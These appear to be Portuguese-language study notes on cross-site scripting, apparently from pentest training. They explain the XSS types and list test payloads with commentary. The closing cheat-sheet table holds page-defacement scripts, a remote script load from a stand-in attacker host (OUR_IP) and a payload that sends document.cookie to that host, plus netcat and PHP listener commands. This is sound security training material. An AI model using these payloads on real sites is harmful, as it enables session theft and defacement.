---
title: Cross-Site Scripting
---

---
### 1. Diferenças entre os XSS

{{< tabs items="Reflected XSS, Stored XSS, DOM-based XSS, Self-XSS" >}}

  {{< tab >}}
**Reflected XSS**:  
Acontece quando você envia um dado malicioso e o **servidor devolve esse dado imediatamente** na resposta.  
Se o dado volta “cru” no HTML, ele é executado pelo navegador.
  {{< /tab >}}

  {{< tab >}}
**Stored XSS**:  
O dado malicioso é **salvo no servidor** (banco de dados, arquivo, perfil, comentário, etc.)  
Depois, quando qualquer usuário acessa a página onde esse conteúdo aparece, o código é executado.
  {{< /tab >}}

  {{< tab >}}
**DOM-based XSS**:  
Não depende do servidor devolver nada malicioso.  
O **JavaScript da página** pega um valor controlado pelo usuário (como `?param=` ou `#hash`) e **insere no DOM sem validação**, fazendo o navegador executar o código.
  {{< /tab >}}

  {{< tab >}}
**Self-XSS**:  
O ataque **não pode ser disparado por URL**.  
Só funciona se a **própria vítima colar ou digitar o payload** no navegador (ex.: console do DevTools).  
É basicamente engenharia social, e não um XSS explorável de verdade.
  {{< /tab >}}

{{< /tabs >}}
---
### Payload 1 – Básico (Reflected/Stored XSS de teste)
Uso esse payload como “hello world” de XSS. A ideia é bem simples: injetar uma tag <script> completa, fazer o navegador executar alert(window.origin) e confirmar duas coisas ao mesmo tempo: (1) que JavaScript está sendo executado na resposta e (2) em qual origem (domínio/iframe) o código está rodando. Isso é útil quando o app usa iframes ou domínios diferentes para formulários, porque o window.origin mostra exatamente de onde o alerta está vindo. Se a aplicação refletir essa tag sem sanitizar/escapar, eu já sei que tenho XSS clássico em contexto HTML.

```<script>alert(window.origin)</script>```
---
### Payload 2 – `<plaintext>` (quebra completa do HTML)
Esse payload não executa JavaScript, mas é extremamente útil para detectar reflexão bruta e confirmar falta total de sanitização ou escaping. A tag `<plaintext>` é um elemento HTML legado que faz o navegador interpretar todo o restante da página como texto puro, sem fechar automaticamente. Ou seja, se esse payload funcionar, a página inteira “desmonta”, revelando que o input está entrando no HTML sem escaping, e que provavelmente outros payloads mais perigosos também irão funcionar. É um ótimo indicador inicial em aplicações com parsing irregular ou filtros parciais.

```<plaintext>```
---
### Payload 3 – `<script>print()</script>` (execução JavaScript alternativa ao alert)
Esse payload serve como variação simples do teste de execução de JavaScript, útil quando `alert()` está filtrado, substituído, ou quando o ambiente do navegador bloqueia pop-ups. A função `print()` costuma continuar disponível e dispara a interface de impressão, confirmando que o payload foi interpretado como código JavaScript válido. Também é útil para diferenciar entre filtragem de palavras-chave e filtragem estrutural do <script>.

```<script>print()</script>```
---
### Payload 4 – `<img src="" onerror=alert(window.origin)>` (XSS baseado em evento HTML)
Esse payload explora um cenário típico onde a aplicação bloqueia `<script>`, mas ainda permite atributos HTML. O elemento <img> com src inválido força um erro de carregamento e dispara o handler onerror, que executa JavaScript no contexto da página. É um dos métodos mais confiáveis para confirmar XSS quando `<script>` é filtrado, já que eventos HTML têm ampla compatibilidade e normalmente passam por validações fracas.

```<img src="" onerror=alert(window.origin)>```
---
### Payload 5 – Alteração direta do estilo via JavaScript (manipulação de DOM)
Esse payload demonstra controle programático do DOM, modificando propriedades visuais sem depender de elementos HTML injetados. Ele prova que o JavaScript injetado pode alterar o estado da interface, modificando CSS e evidenciando capacidade de manipulação arbitrária. É um passo além do simples `alert()` porque mostra que o atacante pode impactar a renderização da página e executar código que interage com o DOM.

```<script>document.body.style.background = "#141d2b"</script>```
---

---
| Code | Description |
| --- | --- |
| **XSS Payloads** |     |
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |     |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80` | Start `PHP` server |
